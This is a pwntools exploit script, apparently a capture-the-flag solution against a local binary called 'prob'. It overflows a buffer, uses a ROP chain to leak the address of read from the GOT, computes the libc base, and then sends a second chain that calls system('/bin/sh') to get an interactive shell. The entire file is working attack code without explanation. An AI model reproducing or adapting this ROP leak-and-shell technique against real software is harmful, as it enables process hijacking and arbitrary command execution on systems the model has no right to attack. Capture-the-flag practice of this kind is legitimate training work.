#! /bin/usr/python3

from pwn import *
import time

p = process("./prob", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')
e = ELF('./prob')
read_got = e.got["read"]
read_plt = e.plt['read']
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
sh = list(libc.search(b"/bin/sh"))[0]
call_write = e.symbols["call_write"]
main = e.symbols["main"]
one_gadget_offset = 0xebd3f
pop_rdi_rsi = 0x40134d
ret = 0x40101a

payload = b'\x72'*0x1f + b'\xd0'
p.sendafter(b": ", payload)

# leak read_got for library address
payload = b'\x52'*0x1f + b'\xd0' +b'A'*0x18
payload+=p64(pop_rdi_rsi)+p64(read_got)+p64(0x8)+p64(call_write)+p64(ret)+p64(main)
pause()
p.sendafter(b": ", payload)

p.recvuntil(b"\n")
read = u64(p.recvn(8))

lb = read - read_offset
one_gadget = lb + one_gadget_offset
system = lb + system_offset
binsh = lb + sh
print(hex(lb))
print(hex(system))


payload = b'\x72'*0x1f + b'\xd0'
p.sendafter(b": ", payload)

payload = b'\x52'*0x1f + b'\xd0' +b'A'*0x18 + p64(pop_rdi_rsi)+p64(binsh)+p64(8)+p64(system)
# pause()
p.sendafter(b": ", payload)
# pause()
p.recvline()

p.interactive()